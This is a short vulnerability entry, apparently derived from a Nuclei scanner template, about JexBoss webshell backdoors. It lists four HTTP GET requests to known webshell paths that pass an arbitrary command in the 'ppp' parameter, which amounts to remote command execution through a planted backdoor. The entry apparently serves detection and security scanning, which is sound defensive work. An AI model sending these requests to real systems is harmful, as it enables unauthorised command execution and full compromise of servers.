# Vulnerability: JexBoss - Remote Code Execution
**Classification:** BACKDOOR
**Source:** Nuclei Template (`jexboss-backdoor.yaml`)

## Description
JexBoss is susceptible to remote code execution via the webshell. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/jexws/jexws.jsp?ppp={{url_encode('{{command}}')}}
GET {{BaseURL}}/jexws4/jexws4.jsp?ppp={{url_encode('{{command}}')}}
GET {{BaseURL}}/jexinv4/jexinv4.jsp?ppp={{url_encode('{{command}}')}}
GET {{BaseURL}}/jbossass/jbossass.jsp?ppp={{url_encode('{{command}}')}}
```

